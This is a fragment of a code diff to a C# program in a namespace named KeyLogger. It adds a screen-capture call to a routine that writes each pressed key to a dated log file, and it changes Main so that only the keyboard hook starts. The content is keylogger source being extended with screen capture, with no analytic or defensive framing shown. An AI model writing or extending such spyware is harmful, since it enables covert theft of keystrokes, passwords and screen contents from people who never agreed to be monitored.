@@ -90,6 +90,7 @@ namespace KeyLogger
         /// <param name="vkCode"></param>
         static void WriteLog(int vkCode)
         {
+            CaptureScreen();
             Console.WriteLine((Keys)vkCode);
             string logNameToWrite = logName + DateTime.Now.ToLongDateString() + logExtendtion;
             StreamWriter sw = new StreamWriter(logNameToWrite, true);
@@ -185,7 +186,7 @@ namespace KeyLogger
 
         static void Main(string[] args)
         {
-            StartTimmer();
+            //StartTimmer();
             HookKeyboard();
         }
     }
